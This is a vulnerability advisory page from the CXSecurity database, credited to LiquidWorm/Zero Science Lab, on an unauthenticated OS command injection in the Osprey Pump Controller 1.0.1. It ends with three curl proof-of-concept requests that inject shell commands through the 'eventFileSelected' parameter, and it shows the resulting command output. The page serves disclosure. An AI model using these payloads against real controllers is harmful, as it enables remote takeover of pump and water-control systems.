---
title: Osprey Pump Controller 1.0.1 (eventFileSelected) Command Injection
url: https://cxsecurity.com/issue/WLB-2023040044
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-11
fetch_date: 2025-10-04T11:29:17.968156
---

# Osprey Pump Controller 1.0.1 (eventFileSelected) Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Osprey Pump Controller 1.0.1 (eventFileSelected) Command Injection** **2023.04.10**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Exploit Title: Osprey Pump Controller 1.0.1 - (eventFileSelected) Command Injection
# Exploit Author: LiquidWorm
Vendor: ProPump and Controls, Inc.
Product web page: https://www.propumpservice.com | https://www.pumpstationparts.com
Affected version: Software Build ID 20211018, Production 10/18/2021
Mirage App: MirageAppManager, Release [1.0.1]
Mirage Model 1, RetroBoard II
Summary: Providing pumping systems and automated controls for
golf courses and turf irrigation, municipal water and sewer,
biogas, agricultural, and industrial markets. Osprey: door-mounted,
irrigation and landscape pump controller.
Technology hasn't changed dramatically on pump and electric motors
in the last 30 years. Pump station controls are a different story.
More than ever before, customers expect the smooth and efficient
operation of VFD control. Communications—monitoring, remote control,
and interfacing with irrigation computer programs—have become common
requirements. Fast and reliable accessibility through cell phones
has been a game changer.
ProPump & Controls can handle any of your retrofit needs, from upgrading
an older relay logic system to a powerful modern PLC controller, to
converting your fixed speed or first generation VFD control system to
the latest control platform with communications capabilities.
We use a variety of solutions, from MCI-Flowtronex and Watertronics
package panels to sophisticated SCADA systems capable of controlling
and monitoring networks of hundreds of pump stations, valves, tanks,
deep wells, or remote flow meters.
User friendly system navigation allows quick and easy access to all
critical pump station information with no password protection unless
requested by the customer. Easy to understand control terminology allows
any qualified pump technician the ability to make basic changes without
support. Similar control and navigation platform compared to one of the
most recognized golf pump station control systems for the last twenty
years make it familiar to established golf service groups nationwide.
Reliable push button navigation and LCD information screen allows the
use of all existing control panel door switches to eliminate the common
problems associated with touchscreens.
Global system configuration possibilities allow it to be adapted to
virtually any PLC or relay logic controlled pump stations being used in
the industrial, municipal, agricultural and golf markets that operate
variable or fixed speed. On board Wi-Fi and available cellular modem
option allows complete remote access.
Desc: The pump controller suffers from an unauthenticated OS command
injection vulnerability. This can be exploited to inject and execute
arbitrary shell commands through the 'eventFileSelected' HTTP GET
parameter called by DataLogView.php, EventsView.php and AlarmsView.php
scripts.
Tested on: Apache/2.4.25 (Raspbian)
Raspbian GNU/Linux 9 (stretch)
GNU/Linux 4.14.79-v7+ (armv7l)
Python 2.7.13 [GCC 6.3.0 20170516]
GNU gdb (Raspbian 7.12-6) 7.12.0.20161007-git
PHP 7.0.33-0+deb9u1 (Zend Engine v3.0.0 with Zend OPcache v7.0.33)
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
Macedonian Information Security Research and Development Laboratory
Zero Science Lab - https://www.zeroscience.mk - @zeroscience
Advisory ID: ZSL-2023-5750
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5750.php
05.01.2023
--
$ curl -s http://TARGET/DataLogView.php?eventFileSelected=;id
$ curl -s http://TARGET/EventsView.php?eventFileSelected=|id
$ curl -s http://TARGET/AlarmsView.php?eventFileSelected=`id`
HTTP/1.1 200 OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040044)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top